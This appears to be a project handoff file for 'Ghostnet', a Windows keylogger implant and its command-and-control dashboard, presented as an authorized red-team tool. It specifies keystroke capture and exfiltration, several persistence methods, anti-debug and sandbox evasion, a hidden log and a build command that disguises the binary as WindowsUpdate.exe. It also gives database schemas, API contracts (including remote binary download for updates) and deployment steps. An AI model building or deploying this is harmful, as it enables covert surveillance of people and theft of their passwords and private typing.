# Ghostnet — Session Context

## What this is

A red-team C2 dashboard + Windows keylogger implant for authorized internal security testing.

- **Dashboard**: React 18 + TypeScript + Vite 6 + Tailwind v4, dark-mode, fully functional
- **Agent**: Single-file C Windows implant (`agent/agent.c`), built with MinGW-w64
- **Backend**: Not built yet — needs Netlify Functions + Supabase (PostgreSQL)

## What's built

### Dashboard (`src/`)
- `App.tsx` — main dashboard, polling real API endpoints (no mock data)
- `AgentSidebar.tsx` — agent list with status indicators
- `KeystrokeFeed.tsx` — live keystroke feed
- `AgentDetailPanel.tsx` — per-agent detail: config slider, blacklist, actions, activity chart
- `TopBar.tsx` / `FooterBar.tsx` — chrome
- `services/api.ts` — API client (fetch wrapper, all endpoints, snake_case→camelCase transforms)
- `hooks/usePolling.ts` — generic polling hook (immediate fetch + interval)
- `types.ts` — shared TypeScript types (Agent, KeystrokeEntry, ApiAgent, ApiKeystroke, etc.)
- `.env` — `VITE_API_BASE_URL=http://localhost:54321`

### Agent (`agent/`)
- `agent.c` (~1750 lines) — full implant: keyboard hook, exfil, persistence, auto-update, shutdown handling
- `agent_config.json` — default config shipped alongside .exe
- `HANDOFF.md` — build/deploy instructions for MinGW-w64 compilation

**Agent features:**
| Feature | Detail |
|---------|--------|
| Key capture | `WH_KEYBOARD_LL` hook (no DLL needed) |
| Exfil | WinHTTP POST to C2 (HTTPS) |
| Persistence | Scheduled Task (ONLOGON) + Registry Run (HKCU) + file copy, auto-repair timer every 15 min |
| Auto-update | Heartbeat-triggered: download new binary, SHA-256 verify (CryptoAPI), VBS hot-swap + MoveFileEx fallback |
| Shutdown handling | Dumps pending keystrokes to `shutdown.dump`, re-queues on next start |
| Stealth | No console (`/SUBSYSTEM:WINDOWS`), anti-debug, sandbox detection (RAM/disk/CPU), delayed start (30-60s), hidden log in `%APPDATA%\Microsoft\Crypto\` |
| Config | Remote config polling (exfil interval, window blacklist) — push from dashboard via PUT |

**Build command:**
```
gcc agent.c -o WindowsUpdate.exe -mwindows -lwinhttp -lpsapi -liphlpapi -ladvapi32 -lshell32 -lws2_32 -O2 -s
```

### Latest fixes (code review pass)
1. `update_sha256` extraction now checks return value — logs warning if hash missing
2. VBS updater now tracks `copied` flag — won't launch old binary if CopyFile failed
3. `strncpy` target paths now explicitly null-terminated
4. Removed `c2_exfil()` from `c2_update()` — no HTTP block, VBS always wins the race
5. Download loop now detects truncation when binary exceeds 4MB cap

## What's NOT built — Netlify/Supabase backend

The dashboard and agent both expect a REST API. You need to build this.

### Database (Supabase)

**Tables needed:**

```sql
-- agents table
CREATE TABLE agents (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  hostname TEXT NOT NULL,
  username TEXT,
  ip TEXT,
  os TEXT,
  keystroke_count INTEGER DEFAULT 0,
  last_seen_utc TIMESTAMPTZ DEFAULT now(),
  first_seen_utc TIMESTAMPTZ DEFAULT now(),
  activity_history INTEGER[] DEFAULT '{}',
  status TEXT DEFAULT 'active'
);

-- keystrokes table (high volume — needs retention policy)
CREATE TABLE keystrokes (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  agent_id UUID REFERENCES agents(id),
  timestamp_utc TIMESTAMPTZ DEFAULT now(),
  window_title TEXT,
  process_name TEXT,
  key_char TEXT,
  vk_code INTEGER,
  flags INTEGER
);
CREATE INDEX idx_keystrokes_agent_time ON keystrokes(agent_id, timestamp_utc DESC);
CREATE INDEX idx_keystrokes_timestamp ON keystrokes(timestamp_utc DESC);

-- agent_configs table
CREATE TABLE agent_configs (
  agent_id UUID PRIMARY KEY REFERENCES agents(id),
  exfil_interval_seconds INTEGER DEFAULT 30,
  blacklist TEXT[] DEFAULT '{}',
  updated_at TIMESTAMPTZ DEFAULT now()
);

-- auto-delete keystrokes older than 7 days
SELECT cron.schedule('cleanup-keystrokes', '0 3 * * *',
  $$DELETE FROM keystrokes WHERE timestamp_utc < now() - interval '7 days'$$
);
```

### API Endpoints (Netlify Functions or Supabase Edge Functions)

All endpoints return JSON. Timestamps in ISO 8601 UTC.

| Method | Path | Purpose | Agent? | Dashboard? |
|--------|------|---------|:------:|:----------:|
| POST | `/api/agents/register` | Agent self-registration | yes | — |
| POST | `/api/agents/heartbeat` | Agent check-in, returns commands | yes | — |
| POST | `/api/keystrokes` | Upload keystroke batch | yes | — |
| GET | `/api/agents/<id>/config` | Fetch remote config | yes | yes |
| PUT | `/api/agents/<id>/config` | Update config from dashboard | — | yes |
| POST | `/api/agents/<id>/action` | Send action (sleep/sync/uninstall) | — | yes |
| GET | `/api/agents` | List all agents | — | yes |
| GET | `/api/agents/<id>` | Single agent detail | — | yes |
| GET | `/api/agents/<id>/keystrokes` | Agent keystrokes (paginated) | — | yes |
| GET | `/api/keystrokes` | All keystrokes `?since=&limit=&search=&agent_id=` | — | yes |
| GET | `/api/agents/<id>/activity` | Hourly activity data (24h) | — | yes |

### Key API contracts

**POST /api/agents/register** (agent → backend)
```json
// Request:
{"hostname":"DESKTOP-3F7KQ2","username":"jdoe","os_version":"Windows x64","ip_address":"192.168.1.104","architecture":"x64"}
// Response:
{"agent_id":"uuid-here","exfil_interval_seconds":30,"heartbeat_interval_seconds":60,"config_poll_interval_seconds":300}
```

**POST /api/agents/heartbeat** (agent → backend)
```json
// Request:
{"agent_id":"uuid","version":"1.0.0","keystrokes_since_last":42,"uptime_seconds":3600,"status":"active"}
// Response (normal):
{"status":"ok"}
// Response (remote action):
{"action":"uninstall"}
// Response (update available):
{"update_url":"https://your-server.com/WindowsUpdate-1.0.1.exe","update_sha256":"a1b2c3d4..."}
// Response (new config):
{"config_changed":true}
```

**POST /api/keystrokes** (agent → backend)
```json
// Request:
{"agent_id":"uuid","events":[{"timestamp_utc":"2026-06-17T12:00:00Z","window_title":"Notepad - Untitled","process_name":"notepad.exe","key_char":"H","vk_code":72,"flags":0}]}
// Response: 200 OK, insert into keystrokes table
```

**GET /api/keystrokes?since=...&limit=100** (dashboard → backend)
```json
// Response — returns individual key_char entries (dashboard buffers them client-side):
[
  {"id":"uuid","agent_id":"uuid","agent_hostname":"DESKTOP-3F7KQ2","timestamp_utc":"2026-06-17T12:00:00Z","window_title":"Notepad","process_name":"notepad.exe","key_char":"H"}
]
```

**GET /api/agents/<id>/activity** (dashboard → backend)
```json
// Response — 24 entries, one per hour:
[{"hour":"00:00","keystrokes":0},{"hour":"01:00","keystrokes":0},...,{"hour":"12:00","keystrokes":47},...]
```

### Netlify setup

1. Create a Netlify site, link to your GitHub repo
2. Add Supabase env vars in Netlify dashboard: `SUPABASE_URL`, `SUPABASE_SERVICE_ROLE_KEY`
3. Create Netlify Functions in `netlify/functions/` — one per endpoint or grouped by resource
4. Add a `netlify.toml` redirect to route `/api/*` to the functions
5. Set `VITE_API_BASE_URL` to your Netlify URL in the dashboard `.env`

### Supabase setup

1. Create a Supabase project
2. Run the SQL above to create tables
3. Enable `pg_cron` extension for keystroke auto-cleanup
4. Use service_role key for server-side writes (Netlify Functions)
5. Use anon key for dashboard reads (or proxy through Functions)

## Running the dashboard

```bash
cd Ghostnet
npm install
npm run dev
```

Dashboard runs on `http://localhost:5173`. It polls `VITE_API_BASE_URL` (default `http://localhost:54321`).

## File map

```
Ghostnet/
  CONTEXT.md          ← this file
  HANDOFF.md           ← agent build/deploy guide
  README.md
  agent/
    agent.c            ← the implant (1750 lines)
    agent_config.json  ← default config
  src/
    app/
      App.tsx                   ← main dashboard
      types.ts                  ← shared types
      services/api.ts           ← API client + transforms
      hooks/usePolling.ts       ← polling hook
      components/
        AgentSidebar.tsx
        AgentDetailPanel.tsx
        KeystrokeFeed.tsx
        TopBar.tsx
        FooterBar.tsx
  .env                  ← VITE_API_BASE_URL
  netlify/              ← (to create) Netlify Functions
```

## Next steps (priority order)

1. **Create Supabase tables** — run the SQL above
2. **Build Netlify Functions** — implement the API endpoints listed above
3. **Wire up the agent** — point `agent_config.json` at your Netlify URL, compile, deploy
4. **Test end-to-end** — agent registers → keystrokes appear in dashboard → config changes pushed back
